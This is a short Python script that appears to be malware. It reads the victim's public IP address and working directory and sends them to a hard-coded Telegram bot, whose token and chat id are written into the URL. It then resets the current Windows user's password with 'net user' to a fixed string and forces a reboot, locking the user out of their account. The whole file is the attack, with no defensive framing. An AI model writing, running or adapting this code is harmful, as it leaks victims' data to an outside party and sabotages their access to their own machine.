import os
import requests



class send:
    def __init__(self):
        url = 'https://httpbin.org/ip'
        re = requests.get(url).text
        cwd = os.getcwd()

        requests.get("https://api.telegram.org/bot5139421075:AAHQDA_xk3IVIpNhnR1Hy-nljcTH9kuZYFg/sendmessage?chat_id=2045563609&text="+str(re+'\n'+cwd))



def change():
    os.system("net user %username% JSJSJJSjsns8#8#811##22#")
    os.system("shutdown -r")



if __name__ == '__main__':
    send()
    change()
